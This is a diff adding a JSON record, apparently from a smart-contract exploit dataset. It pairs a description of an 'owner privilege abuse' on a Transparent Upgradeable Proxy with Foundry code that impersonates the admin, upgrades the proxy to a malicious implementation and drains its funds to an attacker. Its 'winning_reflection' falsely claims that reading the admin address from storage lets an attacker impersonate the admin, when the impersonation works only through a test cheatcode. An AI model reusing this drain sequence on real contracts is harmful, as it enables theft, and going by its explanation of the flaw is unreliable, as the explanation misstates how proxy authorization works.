@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The vulnerability is an Owner Privilege Abuse in a Transparent Upgradeable Proxy. The proxy's admin address, stored at a well-known storage slot (0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103), can be impersonated. This allows an attacker to call the `upgradeTo` function, replacing the proxy's implementation with a malicious contract designed to drain all of the contract's native assets.",
+  "interface_arsenal": "interface ITransparentUpgradeableProxy {\n    function upgradeTo(address newImplementation) external;\n}\n\ninterface IMaliciousProxy {\n    function drain(address payable to) external;\n}",
+  "attack_sequence": "MaliciousImplementation maliciousImpl = new MaliciousImplementation();\n\nvm.startPrank(admin);\nITransparentUpgradeableProxy(TARGET).upgradeTo(address(maliciousImpl));\nvm.stopPrank();\n\nIMaliciousProxy(TARGET).drain(payable(attacker));",
+  "winning_reflection": "The key insight was to exploit the public admin slot of the Transparent Upgradeable Proxy pattern. By reading the admin's address directly from storage, the attacker could impersonate them. This impersonation provided the necessary authorization to execute the `upgradeTo` function, enabling a complete logic replacement with a purpose-built fund-draining contract."
+}
